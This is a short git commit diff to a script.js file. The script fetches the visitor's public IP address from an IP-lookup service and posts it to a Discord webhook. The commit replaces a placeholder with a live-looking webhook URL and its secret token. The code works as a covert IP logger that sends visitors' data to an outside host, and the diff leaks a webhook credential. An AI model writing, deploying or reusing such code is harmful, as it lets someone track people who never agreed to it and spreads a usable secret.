e81a2115e4a561c54b6e19340097eadf7dccdc07
frekzye <161881160+skibiditoileta@users.noreply.github.com>
2026-02-15 00:48:17 +0100

    Update Discord webhook URL in script.js

--- script.js
+++ script.js
@@ -2,7 +2,7 @@ fetch("https://api.ipify.org?format=json")
 .then(response => response.json())
 .then(data => {
 
-    fetch("YOUR_DISCORD_WEBHOOK_URL", {
+    fetch("https://discord.com/api/webhooks/1472378891703423228/97MFKZtTfRIkLTzSXaG63mIZE2wNsCTISrLbs5ZR52w7GVeKM-N52jb-uSzbkU-0lEzA", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
